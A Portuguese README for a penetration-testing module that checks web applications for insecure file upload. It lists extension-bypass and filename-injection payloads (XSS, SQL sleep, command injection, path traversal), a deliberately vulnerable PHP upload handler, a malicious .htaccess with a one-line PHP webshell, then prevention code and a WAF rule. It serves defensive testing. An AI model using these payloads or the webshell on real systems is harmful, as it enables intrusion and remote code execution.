# File Upload Tester - Módulo de Testes Upload Insecure Files

## Descrição

O `file-upload-tester.sh` é um módulo especializado em testes de **File Upload Insecure**. Utiliza payloads do **PayloadsAllTheThings/Upload Insecure Files** para validar proteções contra upload de arquivos maliciosos.

## Motivação

File Upload vulnerabilities são **CRÍTICAS** porque permitem:
- **Remote Code Execution (RCE)**: Upload de webshells (PHP, ASP, JSP)
- **XSS**: Via SVG, HTML uploads
- **XXE**: Via XML, SVG uploads
- **Path Traversal**: Filename manipulation
- **DoS**: ZIP bombs, resource exhaustion
- **Malware Distribution**: Upload de executáveis

## Estrutura

O módulo está organizado em 6 categorias principais com **150+ testes**:

### 1. Extension Bypass (30 testes)
- PHP: `.php`, `.php3-7`, `.phtml`, `.phar`
- Double extension: `.jpg.php`, `.png.php5`
- Reverse: `.php.jpg`
- Case variation: `.pHp`, `.PHP`
- Null byte: `.php%00.gif`
- ASP: `.asp`, `.aspx`, `.cer`, `.asa`
- JSP: `.jsp`, `.jspx`
- Config: `.htaccess`, `web.config`

### 2. Special Characters (25 testes)
- Multiple dots: `file.php......`
- Whitespace: `file.php%20`, `file.php%0a`
- RTLO: `name.%E2%80%AEphp.jpg` → `name.gpj.php`
- Slashes: `file.php/`, `file.php.\`
- NTFS ADS: `file.asp:.jpg`, `file.asp::$data.`
- IIS: `web<<`, `shell.aspx;1.jpg`

### 3. Content-Type Bypass (20 testes)
```bash
Content-Type: image/gif      # Disguise as image
Content-Type: text/php       # Try PHP types
Content-Type: octet-stream   # Generic binary
```

### 4. Magic Bytes (15 testes)
- GIF: `GIF87a`, `GIF89a`
- PNG: `\x89PNG\r\n\x1a\n`
- JPEG: `\xff\xd8\xff`
- Polyglot files (GIF + PHP)
- ImageMagick exploits (CVE-2016-3714,  CVE-2022-44268)
- FFmpeg HLS exploits
- EICAR test file

### 5. Filename Injection (20 testes)
- **XSS**: `<script>alert(1)</script>.jpg`
- **Path Traversal**: `../../../shell.php`
- **SQLi**: `file'(select*from(select(sleep(5)))a)+'.jpg`
- **CMDi**: `file;sleep 5;.jpg`
- **SSTI**: `{{7*7}}.jpg`

### 6. Dangerous Files (20 testes)
- SVG with XSS
- XML with XXE
- CSV injection
- ZIP bomb/slip
- Config files (`.htaccess`, `web.config`)
- `.env`, `package.json`, `composer.json`

## Uso

```bash
./head-test.sh -u https://example.com -c fileupload
./head-test.sh -u https://example.com -c upload  # alias
```

## Severidade

**CVSS: 8.0-10.0 (CRITICAL)**

- RCE via webshell: 10.0
- XSS via SVG: 7.5
- Path Traversal: 8.0

## Exemplo de Exploração

### Código Vulnerável (PHP)
```php
<?php
$target = "uploads/" . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
?>
```

**Exploit** `.htaccess`:
```apache
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg`:
```php
<?php system($_GET['cmd']); ?>
```

## Prevenção

### 1. Whitelist de Extensões
```php
$allowed = ['jpg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die('Invalid extension');
```

### 2. Validar MIME Type E Magic Bytes
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) die('Invalid type');
```

### 3. Renomear Arquivo
```php
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$new_name");
```

### 4. Armazenar Fora de Webroot
```php
$upload_dir = '/var/uploads/'; // Outside /var/www/
```

### 5. Executar Antivírus
```bash
clamscan --infected --remove uploaded_file
```

## Detecção (WAF)

```nginx
# ModSecurity
SecRule FILES "@rx \.(?:php\d?|phtml|jsp|asp|aspx|cer|asa)$" \
  "id:6001,deny,status:403,msg:'Dangerous extension'"
```

## Referências

- [PayloadsAllTheThings - Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

**Meta**: 100% proteção contra upload malicioso!
